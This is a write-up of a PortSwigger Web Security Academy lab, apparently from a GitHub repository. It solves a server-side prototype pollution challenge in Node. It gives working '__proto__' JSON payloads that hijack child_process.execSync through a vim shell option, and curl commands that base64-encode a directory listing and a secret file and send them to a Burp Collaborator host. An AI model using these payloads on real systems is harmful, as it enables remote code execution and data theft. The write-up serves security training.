## Labs Covered

This write-up focuses on the following **EXPERT-level lab** from the PortSwigger Web Security Academy related to **Prototype Pollution**:

**Exfiltrating sensitive data via server-side prototype pollution**  
This lab demonstrates how attackers can leverage server-side prototype pollution to extract sensitive information from the application.

---

### LAB 10 - Exfiltrating sensitive data via server-side prototype pollution

### Lab Description

<img width="786" height="824" alt="image" src="https://github.com/user-attachments/assets/f7d47d90-070d-4dfa-a8a1-5a045dfa434e" />

### Solution


### Study the address change feature

Log in and visit your account page.

<img width="1517" height="823" alt="image" src="https://github.com/user-attachments/assets/6f0a0d2d-5988-472f-b4fc-84e54ebeca22" />


Submit the form for updating your billing and delivery address.

<img width="1594" height="874" alt="image" src="https://github.com/user-attachments/assets/c578a96f-0472-4fba-91c0-6028e950a0a8" />


In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.

Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.

Send the request to Burp Repeater.

<img width="1894" height="698" alt="image" src="https://github.com/user-attachments/assets/8988f991-7b0a-4157-9340-60beec68c372" />


In the image below, we can see the updated data.

<img width="1442" height="401" alt="image" src="https://github.com/user-attachments/assets/bd0d6906-faee-4768-84b4-8da9d7a93981" />

---

### Identify a prototype pollution source

1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property:

   ```json
   "__proto__": {
     "json spaces": 10
   }
   ```
2. Send the request.
3. In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.

---

### Probe for remote code execution

Go to the **admin panel** and observe that there's a button for running maintenance jobs.

<img width="1536" height="449" alt="image" src="https://github.com/user-attachments/assets/091108d4-736e-4566-9248-29356041cf52" />


Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn Node child processes.

<img width="1536" height="464" alt="image" src="https://github.com/user-attachments/assets/49d8fce6-27b8-4cce-b9ad-6c72aee56196" />


Try polluting the prototype with a set of malicious properties that control the options passed to the **child\_process.execSync()** method. The injected command should trigger an interaction with the public Burp Collaborator server:

```json
"__proto__": {
  "shell": "vim",
  "input": ":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

Send the request.

<img width="1454" height="648" alt="image" src="https://github.com/user-attachments/assets/f7bcbbba-488a-4c36-9c03-455c72b80846" />


After sending the request, go to the browser, go to the admin panel, and trigger the **maintenance jobs** to run.

<img width="1705" height="435" alt="image" src="https://github.com/user-attachments/assets/4a51720d-c953-49c5-b76d-778bd7a61d53" />


Observe that, after a short delay, these fail.


<img width="1522" height="676" alt="image" src="https://github.com/user-attachments/assets/76e7e0a7-8120-48eb-9233-6257677601b8" />


In Burp, go to the **Collaborator** tab and poll for interactions. Observe that you have received several interactions. This confirms the remote code execution.

<img width="1503" height="884" alt="image" src="https://github.com/user-attachments/assets/d98e064f-d81d-4060-a392-2eea7ae089ef" />


---

### Leak the hidden file name

In Burp Repeater, modify the payload in your malicious input parameter to a command that leaks the contents of Carlos's home directory to the public Burp Collaborator server. The following is one approach for doing this:

```json
"input": ":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
```

* `-d`: This is a common curl option that tells it to include data in the request body. It's followed by the data itself or an indicator of where the data comes from.
* `@-`: This part tells curl to read the data from standard input (stdin). Standard input is basically the keyboard by default, so you would type the data you want to send directly into the terminal after the curl command.

Send the request.

<img width="1439" height="623" alt="image" src="https://github.com/user-attachments/assets/fb31625e-2ee1-408f-9ffe-4badb2f15e96" />


In the browser, go to the admin panel and trigger the maintenance jobs again.

<img width="1580" height="470" alt="image" src="https://github.com/user-attachments/assets/265aa4f0-233b-4d9b-ada7-634016e8d082" />


Go to the **Collaborator** tab and poll for interactions.
Notice that you have received a new HTTP POST request with a **Base64-encoded body**.

<img width="1471" height="876" alt="image" src="https://github.com/user-attachments/assets/1152b00a-0d8d-49a3-b27e-51427797b274" />


Decode the contents of the body to reveal the names of two entries: `node_apps` and `secret`.

<img width="1874" height="647" alt="image" src="https://github.com/user-attachments/assets/18c8a0b3-2b35-4771-a812-8ef11f2a5f9a" />


---

### Exfiltrate the contents of the secret file

In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file `/home/carlos/secret` to the public Burp Collaborator server. The following is one approach for doing this:

```json
"input": ":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
```

Send the request.

<img width="1445" height="723" alt="image" src="https://github.com/user-attachments/assets/d073fe86-c6d5-432a-a738-37c90630fe41" />


In the browser, go to the admin panel and trigger the maintenance jobs again.

<img width="1522" height="676" alt="image" src="https://github.com/user-attachments/assets/1e3d6fc1-296d-4475-8252-e0ebce2bd7c0" />


Go to the **Collaborator** tab and poll for interactions.
Notice that you have received a new HTTP POST request with a **Base64-encoded** body.

<img width="1427" height="790" alt="image" src="https://github.com/user-attachments/assets/021fa9ac-69a1-4349-9223-f1e60990fe7f" />


Decode the contents of the body to reveal the **secret**.

<img width="1920" height="614" alt="image" src="https://github.com/user-attachments/assets/ff7accb7-de3e-4894-9186-4c712fa264d8" />


In your browser, go to the lab banner and click **Submit solution**. Submit the decoded secret to solve the lab.

<img width="1626" height="337" alt="image" src="https://github.com/user-attachments/assets/d7c3ea8f-aecb-442c-8291-506b7287d07c" />

		

<img width="1630" height="571" alt="image" src="https://github.com/user-attachments/assets/0f908267-2d24-4871-899a-d7ef762b80a6" />


---
